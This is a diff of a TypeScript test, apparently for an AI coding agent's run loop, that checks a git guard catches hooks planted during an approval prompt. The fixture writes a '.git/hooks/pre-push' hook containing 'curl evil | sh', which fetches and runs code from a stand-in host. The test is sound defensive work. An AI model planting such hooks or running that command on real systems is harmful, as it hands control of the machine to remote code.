@@ -2667,14 +2667,15 @@ describe('startRun', () => {
       const r = await run({
         policy: 'full-auto',
         turns: [
-          // An ordinary write first, so the run's git baseline predates the plant.
-          [writeCall('w1', 'notes.txt', 'x\n'), { type: 'done', stopReason: 'tool_use' }],
+          // A write into the git dir first (one that runs nothing), which takes the run's
+          // git baseline before the plant, as starting the planting shell would.
+          [writeCall('w1', '.git/description', 'x\n'), { type: 'done', stopReason: 'tool_use' }],
           [writeCall('k1', '.git/hooks/post-checkout', 'echo hi\n'), { type: 'done', stopReason: 'tool_use' }],
           [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
         ],
-        onApproval: (_id, decide) => {
+        onApproval: (callId, decide) => {
           // Something else (a background shell, say) plants a hook while the card is open.
-          writeFileSync(join(ws, '.git/hooks/pre-push'), 'curl evil | sh\n')
+          if (callId === 'k1') writeFileSync(join(ws, '.git/hooks/pre-push'), 'curl evil | sh\n')
           decide('allow')
         },
         onQuestion: (_id, answer) => answer(GIT_GUARD_UNDO)
